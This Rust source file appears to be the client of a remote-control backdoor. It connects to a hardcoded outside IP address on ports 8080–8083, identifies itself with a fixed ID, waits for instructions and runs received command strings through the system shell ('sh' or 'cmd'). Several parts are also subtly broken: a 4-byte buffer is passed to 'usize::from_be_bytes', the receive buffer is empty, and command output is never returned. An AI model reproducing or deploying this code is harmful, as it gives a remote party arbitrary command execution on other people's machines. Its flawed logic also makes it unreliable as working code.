use std::io::prelude::*;
use std::io::{BufReader, BufWriter, self, Write};
use std::net::SocketAddr;
use std::net::{TcpListener, TcpStream,Shutdown};
use std::process::Command;




static uniq_id: [u8;8] = [5,5,2,0,8,6,0,8];



fn main() {

    let mut inst_buf: [u8; 8] = [0;8];
    let mut stream = match connect() {
        Ok(stream) => stream,
        Err(()) => panic!(),
    };
    

    loop{
        println!("about to recieve");
        rec(&mut inst_buf, &mut stream);

        match u64::from_be_bytes(inst_buf){
            1 => execute(),
            0 => {stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            break;},
            2 => {println!("2 was pressed");
            cmd_commands(&mut stream);
            },
            _ => {},//do nothing 

        };
        
        

    }


}


//function to recieve data
fn rec(buffer: &mut [u8], stream: &mut TcpStream){

    println!("reciving...");
    let mut array_size: [u8;4] = [0;4];
    stream.read(&mut array_size).unwrap();
    let size = usize::from_be_bytes(array_size);


    let mut data_size = 0;
    while ! match stream.read(&mut buffer[..]){
        Ok(n) if n == size  => true,
        Ok(a) => {data_size = data_size + a;
            if data_size == size{
                println!("recieved instr");
                return;
            }
            false},
        Err(_) => panic!("dist failes to read instruction"),
    }{
        

    }
} 

/*fn val(data: &[u8;16]) -> bool{

    for i in 0..8{
        //check if 
        if data[i] != uniq_id[i]{
            return false;
        }
    }
    return true;
}*/



fn connect() -> Result<TcpStream, ()>{


    let addrs = [
        SocketAddr::from(([82, 211, 223, 118], 8080)),
        SocketAddr::from(([82, 211, 223, 118], 8081)),
        SocketAddr::from(([82, 211, 223, 118], 8082)),
        SocketAddr::from(([82, 211, 223, 118], 8083)),
    ];

    if let Ok(mut stream) = TcpStream::connect(&addrs[..]) {
        println!("Connected to the server!");
        //send identifier
        stream.write(&uniq_id[..]).unwrap();
        let mut res:[u8;1] =[0];
        stream.read_exact(&mut res).unwrap();
        if res[0] == 1{
            return Ok(stream);
        }
        else {
            return Err(());
        }
        
    } else {
        println!("Couldn't connect to server...");
        return Err(());
    }
    

}

//make function for each state after initial state
fn cmd_commands(stream: &mut TcpStream){
/*
    let mut byte_size:[u8;8] =[0;8];
    rec(&mut byte_size, stream);
    let size = u64::from_be_bytes(byte_size);
*/

    println!("about to rec commands");
    let mut buffer:Vec<u8> = Vec::new(); 
    rec(&mut buffer, stream);

    println!("just got command");
    let mut s = match std::str::from_utf8(&mut buffer) {
        Ok(v) => v,
        Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
    };
    let story = "hey brey";
    //assert_eq!(s, story);
    println!("command is {}",&s);
    let mut commands: Vec<&str> = s.split(' ').collect();

    //assert_eq!(commands, story);
    
    execute_command(commands);

}

fn execute_command(command: Vec<&str>){

    println!("execute {:?}", &command[..]);
    
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
                .args(&command[..])
                .output()
                .expect("failed to execute process")
    } else {
        Command::new("sh")
                .args(&command[..])
                .output()
                .expect("failed to execute process")
    };
    let hello = output.status;
    io::stdout().write_all(&output.stdout).unwrap();

}

fn execute(){


    
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
                .args(&["/C", "echo hello"])
                .output()
                .expect("failed to execute process")
    } else {
        Command::new("sh")
                .arg("-c")
                .arg("echo hello")
                .output()
                .expect("failed to execute process")
    };
    let hello = output.status;
    io::stdout().write_all(&output.stdout).unwrap();

}